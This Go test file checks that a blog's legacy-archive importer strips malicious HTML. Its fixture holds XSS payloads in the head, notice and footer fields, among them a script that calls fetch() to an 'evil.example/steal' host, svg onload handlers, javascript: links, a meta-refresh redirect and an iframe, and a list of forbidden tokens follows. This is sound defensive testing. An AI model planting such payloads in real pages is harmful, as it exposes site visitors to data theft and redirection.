package etl

import (
	"archive/zip"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Willh92/Volo-go/internal/config"
	"github.com/Willh92/Volo-go/internal/db/migrate"
	"github.com/Willh92/Volo-go/internal/db/sqlx"
	"github.com/Willh92/Volo-go/internal/repo"
)

func TestLegacyImportSanitizesMaliciousHeadNoticeAndFooterInjections(t *testing.T) {
	ctx := context.Background()
	tmp := t.TempDir()

	store, err := sqlx.Open(ctx, sqlx.Options{
		Driver: "sqlite",
		DSN:    filepath.Join(tmp, "legacy-xss.db"),
	})
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	if err := migrate.Up(ctx, store); err != nil {
		t.Fatal(err)
	}

	kr, _, err := config.LoadOrInitKeyRing(strings.Repeat("b", 64), tmp)
	if err != nil {
		t.Fatal(err)
	}
	settingsMgr := repo.NewSettingsManager(store, kr, "en-US")

	zipPath := filepath.Join(tmp, "malicious-legacy.zip")
	zf, err := os.Create(zipPath)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(zf)
	opts := []map[string]any{
		{"oId": "blogTitle", "optionValue": "Migrated Blog"},
		{
			"oId":         "htmlHead",
			"optionValue": `<link rel="stylesheet" href="https://cdn.example.com/theme.css"><script>fetch("https://evil.example/steal")</script><svg onload="alert(1)"><animate attributeName="href" values="javascript:alert(1)"/></svg><meta http-equiv="refresh" content="0;url=https://evil.example">`,
		},
		{
			"oId":         "noticeBoard",
			"optionValue": `<p onclick="alert(1)">Welcome</p><script>alert(2)</script><a href="javascript:alert(3)">bad</a>`,
		},
		{
			"oId":         "footerContent",
			"optionValue": `<span>Copyright</span><iframe src="https://evil.example"></iframe>`,
		},
	}
	rawOpts, _ := json.Marshal(map[string]any{"options": opts})
	w, err := zw.Create("data.json")
	if err != nil {
		t.Fatal(err)
	}
	_, _ = w.Write(rawOpts)
	_ = zw.Close()
	_ = zf.Close()

	if _, err := ImportLegacyArchive(ctx, store, settingsMgr, kr, zipPath, ImportOptions{}); err != nil {
		t.Fatalf("ImportLegacyArchive failed: %v", err)
	}

	site := settingsMgr.Snapshot().Site
	for _, forbidden := range []string{"<script", "<svg", "onload", "onclick", "javascript:", "<iframe", "http-equiv"} {
		if strings.Contains(strings.ToLower(site.CustomHeadMeta), forbidden) {
			t.Fatalf("CustomHeadMeta still contains forbidden token %q: %s", forbidden, site.CustomHeadMeta)
		}
		if strings.Contains(strings.ToLower(site.NoticeBoard), forbidden) {
			t.Fatalf("NoticeBoard still contains forbidden token %q: %s", forbidden, site.NoticeBoard)
		}
		if strings.Contains(strings.ToLower(site.FooterText), forbidden) {
			t.Fatalf("FooterText still contains forbidden token %q: %s", forbidden, site.FooterText)
		}
	}
	if !strings.Contains(site.CustomHeadMeta, "https://cdn.example.com/theme.css") {
		t.Fatalf("expected safe stylesheet link in CustomHeadMeta to survive sanitization, got %q", site.CustomHeadMeta)
	}
}
